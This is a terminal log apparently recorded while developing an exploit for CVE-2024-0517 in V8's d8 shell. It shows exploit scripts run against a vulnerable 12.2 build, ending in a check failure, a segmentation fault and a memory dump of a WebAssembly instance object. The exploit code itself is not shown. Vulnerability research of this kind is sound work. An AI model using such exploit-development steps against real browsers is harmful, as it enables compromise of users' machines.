╭─    v8-exploitation on    master +54 !1 ?2             at   17:09:19
╰─❯ ./v8/out/x64.release/d8 --allow-natives-syntax cve-2024-0517/4-wasm.js -
-shell
[+] Triggering GC for moving GC-resistance objects into old space...
[+] Triggering the bug...


#
# Fatal error in , line 0
# Check failed: v8_flags.fuzzing.
#
#
#
#FailureMessage Object: 0x7ffeaa9b63b0
==== C stack trace ===============================

    ./v8/out/x64.release/d8(v8::base::debug::StackTrace::StackTrace()+0x13) [0x563c3cfd3773]
    ./v8/out/x64.release/d8(+0x1f7cc5b) [0x563c3cfd2c5b]
    ./v8/out/x64.release/d8(V8_Fatal(char const*, ...)+0x145) [0x563c3cfc5225]
    ./v8/out/x64.release/d8(+0x13ee680) [0x563c3c444680]
    ./v8/out/x64.release/d8(v8::internal::Runtime_OptimizeMaglevOnNextCall(int, unsigned long*, v8::internal::Isolate*)+0x42) [0x563c3c43f112]
    ./v8/out/x64.release/d8(+0x1df6d76) [0x563c3ce4cd76]
[1]    10027 trace trap (core dumped)  ./v8/out/x64.release/d8 --allow-natives-syntax cve-2024-0517/4-wasm.js --shel
╭─    v8-exploitation on    master +54 !1 ?2
╰─❯ ./v8-prebuilt/v8-12.2-vuln/d8 --allow-natives-syntax cve-2024-0517/4-wasm.js --shell
[+] Triggering GC for moving GC-resistance objects into old space...
[+] Triggering the bug...
Received signal 11 SEGV_ACCERR 153c999999a1

==== C stack trace ===============================

 [0x7f32be02cb33]
 [0x7f32be02ca82]
 [0x7f32bd8b2ae0]
 [0x7f32c1d0f084]
 [0x7f32c0799162]
 [0x7f32c0788ee8]
 [0x7f32c07778f3]
 [0x7f32c07ceb39]
 [0x7f32bdfd3e03]
 [0x7f32bdfd6243]
 [0x7f32be02b8c8]
 [0x7f32bd908ded]
 [0x7f32bd98c0dc]
[end of stack trace]
[1]    10261 segmentation fault (core dumped)  ./v8-prebuilt/v8-12.2-vuln/d8 --allow-natives-syntax cve-2024-0517/4-wasm.js

╭─    v8-exploitation on    master +54 !1 ?2
╰─❯ ./v8-prebuilt/v8-12.2-vuln/d8 --allow-natives-syntax cve-2024-0517/sample-wasm.js --shell
DebugPrint: 0x1d33000db13d: [WasmInstanceObject] in OldSpace
 - map: 0x1d33000d13b1 <Map[24](HOLEY_ELEMENTS)>
 - properties_or_hash: 0x1d33000006cd <FixedArray[0]>
 - elements: 0x1d33000006cd <FixedArray[0]>
 - module_object: 0x1d33001ca7c9 <Module map = 0x1d33000d1289>
 - exports_object: 0x1d33001ca8e9 <Object map = 0x1d33000db33d>
0x1d33000d13b1: [Map] in OldSpace
 - map: 0x1d33000c3c39 <MetaMap (0x1d33000c3c89 <NativeContext[285]>)>
 - type: WASM_INSTANCE_OBJECT_TYPE
 - instance size: 24
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x1d3300000061 <undefined>
 - prototype_validity cell: 0x1d3300000a31 <Cell value= 1>
 - instance descriptors (own) #0: 0x1d3300000701 <DescriptorArray[0]>
 - prototype: 0x1d33000d145d <Object map = 0x1d33000db0ed>
 - constructor: 0x1d33000d1391 <JSFunction Instance (sfi = 0x1d3300089ab9)>
 - dependent code: 0x1d33000006dd <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

V8 version 12.2.0 (candidate)
d8> 0x0000346790095000
